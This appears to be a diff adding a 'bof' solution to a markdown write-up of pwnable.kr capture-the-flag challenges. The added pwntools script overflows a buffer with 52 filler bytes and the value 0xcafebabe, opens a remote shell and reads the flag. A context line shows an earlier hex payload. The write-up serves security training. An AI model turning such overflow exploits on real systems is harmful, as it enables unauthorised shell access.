@@ -125,3 +125,21 @@ hex-
 `python -c 'print ("\xc8\xce\xc5\x06" * 4 + "\xcc\xce\xc5\x06")'`
 ```
 
+<br/><br/><br/><br/><br/><br/><br/>
+## bof
+<br/><br/>
+
+```python 
+from pwn import *
+
+shell = remote("pwnable.kr", 9000)
+text = 'A' * 52 + '\xbe\xba\xfe\xca'
+
+shell.sendline(text)
+shell.interactive()
+
+#ignore - BytesWarning
+#type ls
+#see flag
+# type cat flag
+```
